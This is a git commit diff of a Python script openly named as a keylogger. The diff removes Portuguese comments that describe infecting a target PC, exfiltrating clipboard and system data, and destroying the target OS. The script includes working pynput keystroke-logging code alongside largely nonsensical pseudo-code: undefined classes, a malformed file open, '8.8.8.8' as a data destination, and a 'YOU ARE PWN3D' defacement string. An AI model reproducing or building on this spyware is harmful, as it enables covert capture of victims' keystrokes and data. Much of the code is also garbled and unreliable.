3303ec57288c28ba215dbd147a286b14be42d642
DiegoDev <diegorego516@gmail.com>
2026-05-02 17:28:07 +0000

    Update keylogger_black_genesis.py

--- keylogger_black_genesis.py
+++ keylogger_black_genesis.py
@@ -1,7 +1,5 @@
-#em pynput, importar o método Listener do teclado
 from pynput.keyboard import Listener
 
-#definir a localização do arquivo de log
 logFile = "/home/diegorego/keylogger_black_genesis/log.txt"
 
 def writeLog(key):
@@ -10,17 +8,13 @@ def writeLog(key):
     via Listener e escrever no arquivo de log
     '''
 
-    #converter a tecla pressionada para string
     keydata = str(key)
 
-    #abrir o arquivo de log no modo append
     with open("logFile, a") as f:
         f.write(keydata)
 
 def FileWrite():
 
-#baixar Arquivos, coisas, virus de computador para PC do alvo, abrir um listener e infectar o computador pessoal do alvo
-#na hora em que o alvo liga seu PC e inicializa o sistema operacional, o listener estará online e pronto para a operação Explorar do Dia Zero
     with FileWrite(on_listener=sendFiles) as fw:
         fw.send()
 
@@ -39,11 +33,9 @@ translate_keys = {
 }
 
 for key in translate_keys:
-    #key recebe a chave do dicionário translate_keys
-    #substituir a chave (key) pelo seu valor (translate_keys[key])
+
     keydata
 
-#em pynput, importar o método Listener do teclado
 logFile = "/home/diegorego/keylogger_black_genesis/log.txt"
 
 def writeLog(key):
@@ -52,7 +44,7 @@ def writeLog(key):
     via Listener e escrever no arquivo de log
     '''
 
-    #dicionário com as teclas a serem traduzidas
+
     translate_keys = {
          "Key.space": " ",
 	 "Key.shift_r": "",
@@ -64,61 +56,37 @@ def writeLog(key):
  	 "Key.caps_lock": "",
 }
 
-#converter a tecla pressionada para string
 keydata = str(key)
 
-#remover as aspas simples que limitam os caracteres
 keydata = keydata.replace("'", "")
 
 for key in translate_keys:
-#key recebe a chave do dicionário translate_keys
-#substituir a chave (key) pelo seu valor (translate_keys[key])
+
     keydata = keydata.replace(key, translate_keys[key])
 
 def File():
 
-#abrir o arquivo de log no modo append
     with open(File) as f:
         f.write(keydata)
 
 def log():
 
-#abrir o Listener do teclado e escutar o evento on_press
-#quando o evento on_press ocorrer, chamar a função writeLog
     with Listener(on_press=writeLog) as l:
         l.join(log)
 
 def sendFiles():
 
-#baixar Arquivos, coisas, virus de computador, para o PC do alvo 
-#abrir um listener e infectar o computador pessoal do alvo
-#na hora em que o alvo liga seu PC 
-#e inicializa o sistema operacional
-#o listener estará online e pronto para a operação Exploração do Dia Zero
     with FileWrite(on_listener=SENDFILES) as FW:
         FW.sendfiles(SENDFILES)
         GET.FDQN_GET.POST = "8.8.8.8"
 
-
-#para capturar a area de transferencia do alvo 
-#e para fazer extração de dados do alvo/hackear (interceptar o alvo) 
-#é assim mesmo, vai ser assim
-#para hackear (interceptar os dados do alvo) faz assim
     with HackIntercept(on_target=CAPTUREDATA) as HI:
         HI.capturedata(CAPTUREDATA)
         POST.SEND_GET_DATA_FROM = "WINDOWS11 / * MSG_AS = MESSAGE: YOU ARE PWN3D, HACKED BY CODK TEAM (BRAZIL HACKER TEAM), RESPECT THE HACKERS."
 
-#captura os dados do sistema operacional alvo 
-#e gera uma tarefa de exfiltração de dados
-#para capturar os dados do sistema operacional alvo, 
-#gerar uma tarefa de exfiltração de dados 
-#e infectar o sistema operacional alvo é assim
     with dataCapture(on_target_operating_system=DATACAPTURE) as DC:
         DC.dataCapture(on_target=DATACAPTURE+EXFILTRATEDATA)
         SEND.POST_MALICIOUS_DATA_TO_TARGET_OPERATING_SYSTEM = "WINDOWS11 / * GET_STATUS_CODE = 200_OK"
 
-#copia os dados do sistema operacional por completo 
-#e espera para criar uma rotina em matar o sistema operacional alvo por completo
-#esse aqui é um comando dos bem perigosos
     with killTargetOS(on_target_os_cmd=KILLSYSTEM) as KTOS: #KILLTARGETOS
         KTC.killSystem("on_target_operating_system=COPY_DATA (Timeout=10) COPY_DATA=5000 MB+KILLSYSTEM") #Wait in seconds and then kill the system completely after copying all the necessary data needed when finished transfering in the data to the main system.
